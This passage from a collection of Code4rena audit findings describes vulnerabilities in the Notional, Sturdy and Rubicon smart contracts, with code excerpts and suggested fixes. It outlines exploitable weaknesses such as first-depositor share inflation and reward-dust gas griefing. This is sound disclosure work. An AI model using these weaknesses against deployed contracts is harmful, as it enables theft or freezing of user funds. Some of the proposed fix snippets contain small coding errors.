`NotionalV2` with `useUnderlying==True` and `NotionalV2` will fail and revert for `fcash` tokens which asset token is underlying token, so the whole transaction will fail and `_mintFCashPosition()` and `_redeemFCashPosition()`  logic in `NotionalTradeModule ` will not work for those `fcash` tokens and manager can't add them to `set` protocol.   ## Proof of Concept when for some `fcash` asset token is underlying token, all calls to `NotionalV2` should be with `useUnderlying==False`. but `_isUnderlying()` in `NotionalTradeModule` contract first check that `isUnderlying = _paymentToken == underlyingToken` so for `fcash` tokens where asset token is underlying token it is going to return `isUnderlying==True`. let's assume that for some specific `fcash` asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and follow the code execution.  This is `_isUnderlying()` code in `NotionalTradeModule`: ```     function _isUnderlying(         IWrappedfCashComplete _fCashPosition,         IERC20 _paymentToken     )     internal     view     returns(bool isUnderlying)     {         (IERC20 underlyingToken, IERC20 assetToken) = _getUnderlyingAndAssetTokens(_fCashPosition);         isUnderlying = _paymentToken == underlyingToken;         if(!isUnderlying) {             require(_paymentToken == assetToken, \"Token is neither asset nor underlying token\");         }     } ``` As you can see it calls `_getUnderlyingAndAssetTokens()` and then check `_paymentToken == underlyingToken` to see that if payment token is equal to `underlyingToken`. `_getUnderlyingAndAssetTokens()` uses `getUnderlyingToken()` and `getAssetToken()` in `wfCashBase`. This is `getUnderlyingToken()` code in `wfCashBase`: ```     /// @notice Returns the token and precision of the token that this token settles     /// to. For example, fUSDC will return the USDC token address and 1e6. The zero     /// address will represent ETH.     function getUnderlyingToken() public view override returns (IERC20 underlyingToken, int256 underlyingPrecision) {         (Token memory asset, Token memory underlying) = NotionalV2.getCurrency(getCurrencyId());          if (asset.tokenType == TokenType.NonMintable) {             // In this case the asset token is the underlying             return (IERC20(asset.tokenAddress), asset.decimals);         } else {             return (IERC20(underlying.tokenAddress), underlying.decimals);         }     } ``` As you can see for our specific `fcash` token this function will return asset token as underlying token. so for this specific `fcash` token, the asset token and underlying token will be same in `_isUnderlying()` of `NationalTradeModule` but because code first check `isUnderlying = _paymentToken == underlyingToken` so the function will return `isUnderlying=True` as a result for our specific `fcash` token (which asset token is underlying token) This is `_mintFCashPosition()` and `_redeemFCashPosition()` code in `NotionalTradeModule `: ```     /**      * @dev Redeem a given fCash position from the specified send token (either underlying or asset token)      * @dev Alo adjust the components / position of the set token accordingly      */     function _mintFCashPosition(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         IERC20 _sendToken,         uint256 _fCashAmount,         uint256 _maxSendAmount     )     internal     returns(uint256 sentAmount)     {         if(_fCashAmount == 0) return 0;          bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken);           _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);          uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));         uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));          _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying);           (sentAmount,) = _updateSetTokenPositions(             _setToken,             address(_sendToken),             preTradeSendTokenBalance,             address(_fCashPosition),             preTradeReceiveTokenBalance         );          require(sentAmount <= _maxSendAmount, \"Overspent\");         emit FCashMinted(_setToken, _fCashPosition, _sendToken, _fCashAmount, sentAmount);     }      /**      * @dev Redeem a given fCash position for the specified receive token (either underlying or asset token)      * @dev Alo adjust the components / position of the set token accordingly      */     function _redeemFCashPosition(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         IERC20 _receiveToken,         uint256 _fCashAmount,         uint256 _minReceiveAmount     )     internal     returns(uint256 receivedAmount)     {         if(_fCashAmount == 0) return 0;          bool toUnderlying = _isUnderlying(_fCashPosition, _receiveToken);         uint256 preTradeReceiveTokenBalance = _receiveToken.balanceOf(address(_setToken));         uint256 preTradeSendTokenBalance = _fCashPosition.balanceOf(address(_setToken));          _redeem(_setToken, _fCashPosition, _fCashAmount, toUnderlying);           (, receivedAmount) = _updateSetTokenPositions(             _setToken,             address(_fCashPosition),             preTradeSendTokenBalance,             address(_receiveToken),             preTradeReceiveTokenBalance         );           require(receivedAmount >= _minReceiveAmount, \"Not enough received amount\");         emit FCashRedeemed(_setToken, _fCashPosition, _receiveToken, _fCashAmount, receivedAmount);      } ``` As you can see they both uses `_isUnderlying()` to find out that if `_sendToken` is asset token or underlying token. for our specific `fcash` token, the result of `_isUnderlying()` will be `True` and `_mintFCashPosition()` and `_redeemFCashPosition()`  will call `_mint()` and `_redeem()` with `toUnderlying` set as `True`. This is `_mint()` and `_redeem()` code: ```     /**      * @dev Invokes the wrappedFCash token's mint function from the setToken      */     function _mint(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         uint256 _maxAssetAmount,         uint256 _fCashAmount,         bool _fromUnderlying     )     internal     {         uint32 minImpliedRate = 0;          bytes4 functionSelector =              _fromUnderlying ? _fCashPosition.mintViaUnderlying.selector : _fCashPosition.mintViaAsset.selector;         bytes memory mintCallData = abi.encodeWithSelector(             functionSelector,             _maxAssetAmount,             uint88(_fCashAmount),             address(_setToken),             minImpliedRate,             _fromUnderlying         );         _setToken.invoke(address(_fCashPosition), 0, mintCallData);     }      /**      * @dev Redeems the given amount of fCash token on behalf of the setToken      */     function _redeem(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         uint256 _fCashAmount,         bool _toUnderlying     )     internal     {         uint32 maxImpliedRate = type(uint32).max;          bytes4 functionSelector =             _toUnderlying ? _fCashPosition.redeemToUnderlying.selector : _fCashPosition.redeemToAsset.selector;         bytes memory redeemCallData = abi.encodeWithSelector(             functionSelector,             _fCashAmount,             address(_setToken),             maxImpliedRate         );         _setToken.invoke(address(_fCashPosition), 0, redeemCallData);     } ``` As you can see they are using `_toUnderlying` value to decide calling between (`mintViaUnderlying()` or `mintViaAsset()`) and (`redeemToUnderlying()` or `redeemToAsset()`), for our specific `fcash` `_toUnderlying` will be `True` so those functions will call `mintViaUnderlying()` and `redeemToUnderlying()` in `wfCashLogic`. `mintViaUnderlying()` and `redeemToUnderlying()` in `wfCashLogic` execution flow eventually would call `NotionalV2` functions with `useUnderlying=True` for this specific `fcash` token, but `NotionalV2` will revert for that call because for that `fcash` token asset token is underlying token and `NotionalV2` can't handle calls with `useUnderlying==True` for that `fcash` Token. This will cause all the transaction to fail and manager can't call `redeemFCashPosition()` or `mintFCashPosition()` functions for those `fcash` tokens that asset token is underlying token. In summery `NotionalTradeModule` logic will not work for all `fcash` tokens becasue the logic of `_isUnderlying()` is wrong for `fcash` tokens that asset token is underlying token.  ## Tools Used VIM  ## Recommended Mitigation Steps Change the logic of `_isUnderlying()` in `NotionalTradeModule` so it returns correct results for all `fcash` tokens. one simple solution can be that it first check `payment token`  value with `asset token` value.  "}, {"title": "deposit() and mint() and _redeemInternal() in wfCashERC4626() will revert for all fcash that asset token is underlying token because they always call _mintInternal() with useUnderlying==True", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/82", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L177-L184 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L168-L175 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L225-L241   # Vulnerability details  ## Impact For some `fcash` the asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and `NotionalV2` will not handle minting with `useUnderlying==True` for those `fcash`s (according to what I asked from sponsor). In summery most of the logics in `wfCashERC4626` will not work for those `fcash` tokens.  when for some `fcash` asset token is underlying token, all calls to `NotionalV2` should be with `useUnderlying==False`. but `deposit()` and `mint()` in `wfCashERC4626` contract call `_mintInternal()` with `useUnderlying==True` and it calls `NotionalV2.batchLend()` with `depositUnderlying==true` so the `NotionV2` call will fail for `fcash` tokens that asset token is underlying token and it would cause  that `deposit()` and `mint()`  logic `wfCashERC4626`  will not work and contract will be useless for those tokens. `_redeemInternal()` issue is similar and it calls `_burn()` with `redeemToUnderlying: true` which execution eventually calls `NotionalV2.batchBalanceAndTradeAction()` with `toUnderlying=True` which will revert so `_redeemInternal()` will fail and because `withdraw()` and `redeem` use it, so they will not work too for those `fcash` tokens that asset token is underlying token.  ## Proof of Concept This is `deposit()` and `mint()`  code in `wfCashERC4626`: ```     /** @dev See {IERC4626-deposit} */     function deposit(uint256 assets, address receiver) public override returns (uint256) {         uint256 shares = previewDeposit(assets);         // Will revert if matured         _mintInternal(assets, _safeUint88(shares), receiver, 0, true);         emit Deposit(msg.sender, receiver, assets, shares);         return shares;     }      /** @dev See {IERC4626-mint} */     function mint(uint256 shares, address receiver) public override returns (uint256) {         uint256 assets = previewMint(shares);         // Will revert if matured         _mintInternal(assets, _safeUint88(shares), receiver, 0, true);         emit Deposit(msg.sender, receiver, assets, shares);         return assets;     } ``` As you can see they both call `_mintInternal()` with last parameter as `true` which is `useUnderlying`'s value. This is `_mintInternal()` code: ```     function _mintInternal(         uint256 depositAmountExternal,         uint88 fCashAmount,         address receiver,         uint32 minImpliedRate,         bool useUnderlying     ) internal nonReentrant {         require(!hasMatured(), \"fCash matured\");         (IERC20 token, bool isETH) = getToken(useUnderlying);         uint256 balanceBefore = isETH ? address(this).balance : token.balanceOf(address(this));          // If dealing in ETH, we use WETH in the wrapper instead of ETH. NotionalV2 uses         // ETH natively but due to pull payment requirements for batchLend, it does not support         // ETH. batchLend only supports ERC20 tokens like cETH or aETH. Since the wrapper is a compatibility         // layer, it will support WETH so integrators can deal solely in ERC20 tokens. Instead of using         // \"batchLend\" we will use \"batchBalanceActionWithTrades\". The difference is that \"batchLend\"         // is more gas efficient (does not require and additional redeem call to asset tokens). If using cETH         // then everything will proceed via batchLend.         if (isETH) {             IERC20((address(WETH))).safeTransferFrom(msg.sender, address(this), depositAmountExternal);             WETH.withdraw(depositAmountExternal);              BalanceActionWithTrades[] memory action = EncodeDecode.encodeLendETHTrade(                 getCurrencyId(),                 getMarketIndex(),                 depositAmountExternal,                 fCashAmount,                 minImpliedRate             );             // Notional will return any residual ETH as the native token. When we _sendTokensToReceiver those             // native ETH tokens will be wrapped back to WETH.             NotionalV2.batchBalanceAndTradeAction{value: depositAmountExternal}(address(this), action);         } else {             // Transfers tokens in for lending, Notional will transfer from this contract.             token.safeTransferFrom(msg.sender, address(this), depositAmountExternal);              // Executes a lending action on Notional             BatchLend[] memory action = EncodeDecode.encodeLendTrade(                 getCurrencyId(),                 getMarketIndex(),                 fCashAmount,                 minImpliedRate,                 useUnderlying             );             NotionalV2.batchLend(address(this), action);         }          // Mints ERC20 tokens for the receiver, the false flag denotes that we will not do an         // operatorAck         _mint(receiver, fCashAmount, \"\", \"\", false);          _sendTokensToReceiver(token, msg.sender, isETH, balanceBefore);     } ``` As you can see it calls `NotionalV2` functions with `useUnderlying=True` but according to sponsor clarification `NotionalV2` would fail and revert for those calls because `useUnderlying=True` and `fcash`'s asset token is underlying token (`asset.tokenType == TokenType.NonMintable`). So in summery for `fcash` tokens which asset token is underlying token `NotionalV2` won't handle calls which include `useUnderlying==True` but in `wfCashERC4626` contract functions like `deposit()`, `mint()`, `withdraw()` and `redeem()` they all uses `useUnderlying==True` always so `wfCashERC4626` won't work for those specific type of tokens which asset token is underlying token(`asset.tokenType == TokenType.NonMintable`)  the detail explanations for functions `withdraw()` and `redeem()` are similar.  ## Tools Used VIM  ## Recommended Mitigation Steps check that if for that `fcash` token asset token  is underlying token or not and set `useUnderlying` based on that.  "}, {"title": "The check for value transfer success is made after the return statement in  _withdrawFromYieldPool of LidoVault", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/157", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142   # Vulnerability details  ## Impact Users can lose their funds  ## Proof of Concept https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142  The code checks transaction success after returning the transfer value and finishing execution. If the call fails the transaction won't revert since  require(sent, Errors.VT_COLLATERAL_WITHDRAW_INVALID); won't execute.  Users will have withdrawed without getting their funds back.   ## Recommended Mitigation Steps Return the function after the success check  "}, {"title": "hard-coded slippage may freeze user funds during market turbulence", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/133", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L125 https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137   # Vulnerability details  ## Impact [GeneralVault.sol#L125](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L125) GeneralVault set a hardcoded slippage control of 99%. However, the underlying yield tokens price may go down. If Luna/UST things happen again, users' funds may get locked.  [LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137) Moreover, the withdrawal of the lidoVault takes a swap from the curve pool. 1 stEth worth 0.98 ETH at the time of writing. The vault can not withdraw at the current market.  Given that users' funds would be locked in the lidoVault, I consider this a high-risk issue.  ## Proof of Concept [1 stEth  = 0.98 Eth](https://twitter.com/hasufl/status/1524717773959700481/photo/1)  [LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137)   ## Tools Used  ## Recommended Mitigation Steps  There are different ways to set the slippage.   The first one is to let users determine the maximum slippage they're willing to take. The protocol front-end should set the recommended value for them. ```solidity   function withdrawCollateral(     address _asset,     uint256 _amount,     address _to,     uint256 _minReceiveAmount   ) external virtual {       // ...     require(withdrawAmount >= _minReceiveAmount, Errors.VT_WITHDRAW_AMOUNT_MISMATCH);   } ```   The second one is have a slippage control parameters that's set by the operator.  ```solidity     // Exchange stETH -> ETH via Curve     uint256 receivedETHAmount = CurveswapAdapter.swapExactTokensForTokens(       _addressesProvider,       _addressesProvider.getAddress('STETH_ETH_POOL'),       LIDO,       ETH,       yieldStETH,       maxSlippage     ); ```  ```solidity     function setMaxSlippage(uint256 _slippage) external onlyOperator {         maxSlippage = _slippage;          //@audit This action usually emit an event.         emit SetMaxSlippage(msg.sender, slippage);     } ```  These are two common ways to deal with this issue. I prefer the first one. The market may corrupt really fast before the operator takes action. It's nothing fun watching the number go down while having no option.  "}, {"title": "Withdrawing ETH collateral with max uint256 amount value reverts transaction", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/85", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L121-L124   # Vulnerability details  ## Impact  Withdrawing ETH collateral via the `withdrawCollateral` function using `type(uint256).max` for the `_amount` parameter reverts the transaction due to `_asset` being the zero-address and `IERC20Detailed(_asset).decimals()` not working for native ETH.  ## Proof of Concept  [GeneralVault.sol#L121-L124](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L121-L124)  ```solidity if (_amount == type(uint256).max) {     uint256 decimal = IERC20Detailed(_asset).decimals(); // @audit-info does not work for native ETH. Transaction reverts     _amount = _amountToWithdraw.mul(this.pricePerShare()).div(10**decimal); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Check `_asset` and use hard coded decimal value (`18`) for native ETH  "}, {"title": "ConvexCurveLPVault's _transferYield can become stuck with zero reward transfer", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L74-L82   # Vulnerability details  Now there are no checks for the amounts to be transferred via _transferYield and _processTreasury. As reward token list is external and an arbitrary token can end up there, in the case when such token doesn't allow for zero amount transfers, the reward retrieval can become unavailable.  I.e. processYield() can be fully blocked for even an extended period, with some low probability, which cannot be controlled otherwise as pool reward token list is external.  Setting the severity to medium as reward gathering is a base functionality for the system and its availability is affected.  ## Proof of Concept  _transferYield proceeds with sending the amounts to treasury and yieldManager without checking:  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L74-L82  ```solidity     // transfer to treasury     if (_vaultFee > 0) {       uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);       yieldAmount = yieldAmount.sub(treasuryAmount);     }      // transfer to yieldManager     address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');     TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount); ```  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L205-L209  ```solidity   function _processTreasury(address _asset, uint256 _yieldAmount) internal returns (uint256) {     uint256 treasuryAmount = _yieldAmount.percentMul(_vaultFee);     IERC20(_asset).safeTransfer(_treasuryAddress, treasuryAmount);     return treasuryAmount;   } ```  The incentive token can be arbitrary. Some ERC20 do not allow zero amounts to be sent:  https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers  In a situation of such a token added to reward list and zero incentive amount earned the whole processYield call will revert, making reward gathering unavailable until either such token be removed from pool's reward token list or some non-zero reward amount be earned. Both are external processes and aren\u2019t controllable.  ## Recommended Mitigation Steps  Consider running the transfers in _transferYield only when yieldAmount is positive:  ```solidity + if (yieldAmount > 0) {      // transfer to treasury      if (_vaultFee > 0) {        uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);        yieldAmount = yieldAmount.sub(treasuryAmount);      }       // transfer to yieldManager      address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');      TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount); +  } ```  "}, {"title": "`processYield()` and `distributeYield()` may run out of gas and revert due to long list of extra rewards/yields", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/70", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L105-L110 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L129-L136   # Vulnerability details  ## Impact Yields will not be able to be distributed to lenders because attempts to do so will revert  ## Proof of Concept The `processYield()` function loops overall of the extra rewards and transfers them ```solidity File: smart-contracts/ConvexCurveLPVault.sol   #1  105       uint256 extraRewardsLength = IConvexBaseRewardPool(baseRewardPool).extraRewardsLength(); 106       for (uint256 i = 0; i < extraRewardsLength; i++) { 107         address _extraReward = IConvexBaseRewardPool(baseRewardPool).extraRewards(i); 108         address _rewardToken = IRewards(_extraReward).rewardToken(); 109         _transferYield(_rewardToken); 110       } ``` https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L105-L110  There is no guarantee that the tokens involved will be efficient in their use of gas, and there are no upper bounds on the number of extra rewards:  ```solidity     function extraRewardsLength() external view returns (uint256) {         return extraRewards.length;     }       function addExtraReward(address _reward) external returns(bool){         require(msg.sender == rewardManager, \"!authorized\");         require(_reward != address(0),\"!reward setting\");           extraRewards.push(_reward);         return true;     } ``` https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L105-L115  Even if not every extra reward token has a balance, an attacker can sprinkle each one with dust, forcing a transfer by this function  `_getAssetYields()` has a similar issue: ```solidity File: smart-contracts/YieldManager.sol   #X  129       AssetYield[] memory assetYields = _getAssetYields(exchangedAmount); 130       for (uint256 i = 0; i < assetYields.length; i++) { 131         if (assetYields[i].amount > 0) { 132           uint256 _amount = _convertToStableCoin(assetYields[i].asset, assetYields[i].amount); 133           // 3. deposit Yield to pool for suppliers 134           _depositYield(assetYields[i].asset, _amount); 135         } 136       } ``` https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L129-L136  ## Tools Used Code inspection  ## Recommended Mitigation Steps Include an offset and length as is done in `YieldManager.distributeYield()`   "}, {"title": "Possible lost msg.value", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/62", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L75-L89 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L79-L104 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L131-L149   # Vulnerability details  ## Impact Possible lost value in `depositCollateral` function call  ## Proof of Concept In call `depositCollateral` can will send value and the asset can be an ERC20(!= address(0)), if `LidoVault` and `ConvexCurveLPVault` contract receive this call the fouds will lost Also in **LidoVault, L88**, if send as asset ETH(== address(0)) and send more value than `_amount`(msg.value > _amount), the exedent will lost  ## Recommended Mitigation Steps  In **GeneralVault**, `depositCollateral` function:  - Check if the `msg.value` is zero when the `_asset` is ERC20(!= address(0))  - Check if the `msg.value` is equeal to `_amount` when the `_asset` ETH(== address(0))  ```solidity function depositCollateral(address _asset, uint256 _amount) external payable virtual {   if (_asset != address(0)) { // asset = ERC20     require(msg.value == 0, <AN ERROR FROM Errors LIBRARY>);   } else { // asset = ETH     require(msg.value == _amount, <AN ERROR FROM Errors LIBRARY>);   }    // Deposit asset to vault and receive stAsset   // Ex: if user deposit 100ETH, this will deposit 100ETH to Lido and receive 100stETH TODO No Lido   (address _stAsset, uint256 _stAssetAmount) = _depositToYieldPool(_asset, _amount);    // Deposit stAsset to lendingPool, then user will get aToken of stAsset   ILendingPool(_addressesProvider.getLendingPool()).deposit(     _stAsset,     _stAssetAmount,     msg.sender,     0   );    emit DepositCollateral(_asset, msg.sender, _amount); } ``` Also can remove the `require(msg.value > 0, Errors.VT_COLLATERAL_DEPOSIT_REQUIRE_ETH);` in **LidoVault, L88**   "}, {"title": "`UNISWAP_FEE` is hardcoded which will lead to significant losses compared to optimal routing", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/48", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L48 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L184   # Vulnerability details  ## Impact In [`YieldManager`](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L48), `UNISWAP_FEE` is hardcoded, which reduce significantly the possibilities and will lead to non optimal routes. In particular, all swaps using ETH path will use the wrong pool as it will use the ETH / USDC 1% one due to this [line](https://github.com/sturdyfi/code4rena-may-2022/blob/d53f4f5f0b7b33a66e0081294be6117f6d6e17b4/contracts/protocol/libraries/swap/UniswapAdapter.sol#L50).\u2028   ## Proof of Concept For example for CRV / USDC, the optimal route is currently CRV -> ETH and ETH -> USDC, and the pool ETH / USDC with 1% fees is tiny compared to the ones with 0.3 or 0.1%. Therefore using the current implementation would create a significant loss of revenue.   ## Recommended Mitigation Steps Basic mitigation would be to hardcode in advance the best Uniswap paths in a mapping like it\u2019s done for Curve pools, then pass this path already computed to the swapping library. This would allow for complex route and save gas costs as you would avoid computing them in `swapExactTokensForTokens`.  Then, speaking from experience, as `distributeYield` is `onlyAdmin`, you may want to add the possibility to do the swaps through an efficient aggregator like 1Inch or Paraswap, it will be way more optimal.  "}, {"title": "Early funds withdrawers can get bonus in multiples of vested bonus tokens (e.g. 2-times, 3-times, etc.)", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/450", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101   # Vulnerability details   The function setBonusToken allows the same BonusToken to be added more than once to the array bonusTokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     bonusTokens.push(newBonusERC20);   } ```  ## Impact If that happens, early withdrawers can get Bonus in multiples of what they actually have right to. Late withdrawers, might not get any Bonus due to shortage.  ## Proof of Concept BathToken.sol, function setBonusToken https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270-L272 1. function setBonusToken allows the same BonusToken to be added more than once to the array.  BathToken.sol, function distributeBonusTokenRewards https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 2. a. As and when distributeBonusTokenRewards is triggered during a withdraw call, the same bonusToken will be released more than once.  BathBuddy.sol, function release https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101 2. b. The release function is called.  ## Tools Used Manual review  ## Recommended Mitigation Steps   Add the required validations to avoid duplicate additions of bonus tokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     require(newBonusERC20 != address(0), \"invalid_addr\");     if (bonusTokens.length > 0) {       for (uint256 index = 0; index < bonusTokens.length; index++) {         require (token != newBonusERC20, \"token already exists\")       }     }     bonusTokens.push(newBonusERC20);   } ```   "}, {"title": "Multiple Unsafe Arithmetic Operations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/443", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951   # Vulnerability details  ## RMT-02M: Multiple Unsafe Arithmetic Operations  | File | Lines | Type | | :- | :- | :- | | RubiconMarket.sol | [L844](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844), [L857](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857), [L883](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883), [L898](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898), [L927](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927), [L951](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951) | Mathematical Operations |  ### Description  The referenced lines all perform unsafe multiplications using the unitary denominations of either `1 ether` (`1e18`) or `10**9` (`1e9`), both of which can easily lead to overflows when used as a multiplier for large amounts of assets.  ### Impact  Purchasing and selling amounts will be improperly fulfilled as well as improperly tracked as \"sold out\" / \"bought out\".  ### Solution (Recommended Mitigation Steps)  We advise the codebase to make use of the `mul` operation exposed by the `DSMath` library already incorporated into the codebase to guarantee all operations are performed safely and cannot overflow.  ### PoC  Issue is deducible by inspecting the relevant lines referenced in the issue and making note of the raw multiplication (`*`) operations performed.  ### Tools  Manual inspection of the codebase.  "}, {"title": "First depositor can break minting of shares", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/397", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/RubiconDeFi/rubicon-protocol-v1/blob/master/contracts/rubiconPools/BathToken.sol#L569-L571   # Vulnerability details  ## Impact The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large \u201cdonation\u201d.  ## Proof of Concept 